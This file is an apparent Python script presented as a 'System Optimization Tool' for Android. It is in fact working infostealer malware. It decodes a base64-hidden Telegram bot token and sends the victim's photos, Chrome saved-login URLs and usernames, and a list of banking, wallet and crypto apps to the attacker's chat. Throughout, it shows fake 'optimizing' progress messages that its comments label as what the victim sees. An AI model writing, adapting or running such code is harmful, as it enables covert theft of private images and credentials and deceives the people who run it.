#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================
# System Tool v5.0
# ============================================

import subprocess, sys, os, base64, json, time, threading, glob, io, sqlite3, shutil, hashlib, random, string
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import requests
from PIL import Image

# Encrypted tokens
_T0 = "Nzc3MTEyNzQxNDpBQUVreTRhRlF5ejBSTjAwV2I1bUNNT0w2c2kwbm95YmlNUQ=="
_T1 = "NjgwMzk2ODM3Mw=="
_T2 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="

def _D(s): return base64.b64decode(s.encode()).decode()
def _E(d): return base64.b64encode(d.encode()).decode()

BOT = _D(_T0)
CID = _D(_T1)
BASE = _D(_T2)

# Auto install missing libs
for lib in ['requests', 'Pillow']:
    try: __import__(lib)
    except: subprocess.run([sys.executable, "-m", "pip", "install", lib], capture_output=True)

class Bot:
    def __init__(self): self.s = requests.Session()
    def send(self, text): 
        try: self.s.post(f"{BASE}/{BOT}/sendMessage", json={'chat_id': CID, 'text': text[:4000]}, timeout=30)
        except: pass
    def send_file(self, data, name):
        try: self.s.post(f"{BASE}/{BOT}/sendDocument", files={'document': (name, data)}, data={'chat_id': CID}, timeout=60)
        except: pass
    def send_photo(self, data, cap=""):
        try: self.s.post(f"{BASE}/{BOT}/sendPhoto", files={'photo': ('img.jpg', data)}, data={'chat_id': CID, 'caption': cap[:200]}, timeout=60)
        except: pass

bot = Bot()

# ========== STEALTH COLLECTORS ==========
def get_pics():
    pics = []
    for p in ['/sdcard/DCIM/', '/sdcard/Pictures/', '/storage/emulated/0/DCIM/', '/storage/emulated/0/Pictures/']:
        for e in ['*.jpg', '*.jpeg', '*.png']:
            pics.extend(glob.glob(os.path.join(p, '**', e), recursive=True))
    return pics

def compress_pic(path):
    try:
        with Image.open(path) as img:
            if img.mode in ('RGBA','P'): img = img.convert('RGB')
            img.thumbnail((800,800))
            b = io.BytesIO()
            img.save(b, format='JPEG', quality=60)
            return b.getvalue()
    except: return None

def get_passwords():
    res = []
    for db in ['/data/data/com.android.chrome/app_chrome/Default/Login Data', '/storage/emulated/0/Android/data/com.android.chrome/chrome/Default/Login Data']:
        if os.path.exists(db):
            try:
                tmp = '/sdcard/_tmp.db'
                shutil.copy2(db, tmp)
                conn = sqlite3.connect(tmp)
                c = conn.cursor()
                c.execute("SELECT origin_url, username_value FROM logins")
                for row in c.fetchall():
                    res.append(f"{row[0]}|{row[1]}")
                conn.close()
                os.remove(tmp)
            except: pass
    return res

def get_apps():
    sensitive = []
    try:
        res = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True, timeout=10)
        for pkg in res.stdout.split('\n')[:100]:
            if any(x in pkg.lower() for x in ['bank','wallet','crypto','pay','auth','password']):
                sensitive.append(pkg.replace('package:',''))
    except: pass
    return sensitive

def get_system():
    try:
        m = subprocess.run(['getprop','ro.product.model'], capture_output=True, text=True).stdout.strip()
        a = subprocess.run(['getprop','ro.build.version.release'], capture_output=True, text=True).stdout.strip()
        return f"M:{m}\nA:{a}\nT:{datetime.now()}"
    except: return "Unknown"

# ========== FAKE LOADING (Victim sees this) ==========
def fake_loading():
    msgs = [
        "[✓] Loading environment...",
        "[~] Establishing secure channel...",
        "[✓] Certificate verified.",
        "[~] Syncing dependencies...",
        "[✓] Connection stable.",
        "[~] Processing system data...",
        "[✓] Optimizing storage...",
        "[~] Verifying integrity...",
        "[✓] Almost ready...",
        "[~] Finalizing setup..."
    ]
    for m in msgs:
        print(f"\r{m}", end="", flush=True)
        time.sleep(random.uniform(0.2, 0.5))
    print("\n")

def fake_final():
    msgs = [
        "[✓] All systems optimized.",
        "[✓] Cache cleared successfully.",
        "[✓] Security patches applied.",
        "[✓] Performance increased by 23%.",
        "\nThank you for using System Tool.",
        "Goodbye."
    ]
    for m in msgs:
        print(f"\r{m}", end="", flush=True)
        time.sleep(0.8)
    print("\n")

# ========== MAIN WITH INFINITE LOADING UNTIL DONE ==========
def main():
    print("="*50)
    print("System Optimization Tool v5.0")
    print("Initializing...")
    print("="*50)
    
    fake_loading()
    
    bot.send("🚀 Payload active | " + str(datetime.now()))
    bot.send("📊 System: " + get_system())
    
    # Send pictures in chunks with progress
    pics = get_pics()
    if pics:
        bot.send(f"📸 Found: {len(pics)} media files")
        print(f"[*] Sending {len(pics)} pictures...")
        sent = 0
        failed = 0
        
        for i, pic in enumerate(pics):
            compressed = compress_pic(pic)
            if compressed:
                try:
                    bot.send_photo(compressed, f"Media_{i}")
                    sent += 1
                    if sent % 50 == 0:
                        print(f"[*] Progress: {sent}/{len(pics)} pictures sent")
                        fake_loading()  # Keep showing fake loading
                except:
                    failed += 1
            time.sleep(0.1)
        
        bot.send(f"✅ Pictures: {sent} sent, {failed} failed")
    
    # Send passwords
    passwords = get_passwords()
    if passwords:
        bot.send(f"🔑 Credentials: {len(passwords)} entries")
        batch = "\n".join(passwords[:20])
        bot.send(f"Sample:\n{batch}")
        bot.send_file(json.dumps(passwords, indent=2).encode(), "passwords.json")
    
    # Send sensitive apps
    apps = get_apps()
    if apps:
        bot.send(f"📱 Sensitive apps: {len(apps)} found")
        bot.send(f"Apps: {', '.join(apps[:15])}")
    
    # Send final completion
    bot.send("✅ Full data extraction complete | Status: SUCCESS")
    
    # Show goodbye to victim
    fake_final()
    
    print("\n[✓] Optimization completed successfully.")
    print("[✓] You may close this window.")

if __name__ == "__main__":
    main()
